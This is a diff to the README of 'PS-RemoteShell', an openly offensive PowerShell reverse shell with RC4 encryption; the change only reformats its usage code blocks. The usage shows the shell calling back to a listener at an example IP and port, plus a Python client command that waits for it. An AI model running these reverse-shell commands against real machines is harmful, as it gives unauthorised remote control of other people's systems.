@@ -4,8 +4,8 @@ Small powershell reverse shell using RC4 encryption
 # Usage
 ```
 PS-RemoteShell -ip 1.1.1.1 -port 1111 -key test
-
-On your host
+```
+```
 $ python PsShellClient.py
 PS-RemoteShell Python Client v1.0
 Mr.Un1k0d3r RingZer0 Team
@@ -13,7 +13,7 @@ Mr.Un1k0d3r RingZer0 Team
 
 Usage: PsShellClient.py ip port key
 
-python PsShellClient.py 0.0.0.0 1111 test
+$ python PsShellClient.py 0.0.0.0 1111 test
 ```
 
 # Example
